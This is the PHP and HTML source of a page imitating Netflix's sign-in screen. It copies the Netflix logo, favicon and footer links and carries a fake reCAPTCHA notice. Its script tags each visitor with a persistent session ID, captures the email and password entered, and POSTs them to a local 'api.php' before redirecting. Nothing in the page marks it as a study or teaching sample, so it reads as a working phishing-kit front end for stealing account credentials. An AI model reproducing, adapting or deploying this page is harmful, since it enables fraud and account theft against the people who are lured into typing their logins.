<?php require_once 'config.php'; $lang = getLang(); ?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>" dir="<?php echo $lang === 'ar' ? 'rtl' : 'ltr'; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - <?php echo t('signin', $lang); ?></title>
    <link rel="stylesheet" href="assets/style.css">
    <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/favicon.ico">
</head>
<body>
    <div class="bg-wrapper">
        <div class="bg-image"></div>
        <div class="bg-overlay"></div>
    </div>

    <header class="nf-header">
        <a href="#" class="nf-logo">
            <svg viewBox="0 0 111 30" fill="#e50914"><path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.125L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.532-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687H35.97V0h13.375v4.687h-4.001zM24.938 4.687V0H11.22v4.687h4.687v21.625c1.5 0 3.063.063 4.594.188V4.687h4.437zm-17.5 21.03c-1.813-.156-3.625-.25-5.438-.343V0h5.438v25.717z"/></svg>
        </a>
        <div class="lang-selector">
            <select onchange="window.location.href='?lang='+this.value">
                <?php foreach ($langs as $k => $v): ?>
                <option value="<?php echo $k; ?>" <?php echo $lang === $k ? 'selected' : ''; ?>><?php echo $v; ?></option>
                <?php endforeach; ?>
            </select>
        </div>
    </header>

    <main class="nf-main">
        <div class="nf-card">
            <h1><?php echo t('signin', $lang); ?></h1>
            <form id="loginForm">
                <div class="nf-input-wrap">
                    <input type="text" id="email" required placeholder=" ">
                    <label><?php echo t('email', $lang); ?></label>
                </div>
                <div class="nf-input-wrap">
                    <input type="password" id="password" required placeholder=" ">
                    <label><?php echo t('password', $lang); ?></label>
                </div>
                <button type="submit" class="nf-btn" id="submitBtn">
                    <?php echo t('signin', $lang); ?>
                </button>

                <div class="nf-help">
                    <label class="nf-check">
                        <input type="checkbox" checked>
                        <span><?php echo t('remember', $lang); ?></span>
                    </label>
                    <a href="#"><?php echo t('help', $lang); ?></a>
                </div>

                <div class="nf-signup">
                    <?php echo t('new', $lang); ?> <a href="#"><?php echo t('signup', $lang); ?></a>
                </div>

                <div class="nf-recaptcha">
                    This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="nf-footer">
        <div class="nf-footer-inner">
            <p>Questions? Call 1-844-505-2993</p>
            <ul class="nf-links">
                <li><a href="#">FAQ</a></li>
                <li><a href="#">Help Center</a></li>
                <li><a href="#">Terms of Use</a></li>
                <li><a href="#">Privacy</a></li>
                <li><a href="#">Cookie Preferences</a></li>
                <li><a href="#">Corporate Information</a></li>
            </ul>
        </div>
    </footer>

    <script>
        function genSID() {
            let s = localStorage.getItem('nf_sid');
            if (!s) {
                s = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b => b.toString(16).padStart(2,'0')).join('');
                localStorage.setItem('nf_sid', s);
            }
            return s;
        }
        const sid = genSID();
        const lang = '<?php echo $lang; ?>';

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerHTML = '<span class="spinner"></span>';
            btn.disabled = true;

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                const res = await fetch('api.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'action=login&sid=' + sid + '&email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password)
                });
                const data = await res.json();
                if (data.redirect) window.location.href = data.redirect;
            } catch (err) {
                btn.innerHTML = '<?php echo t('signin', $lang); ?>';
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
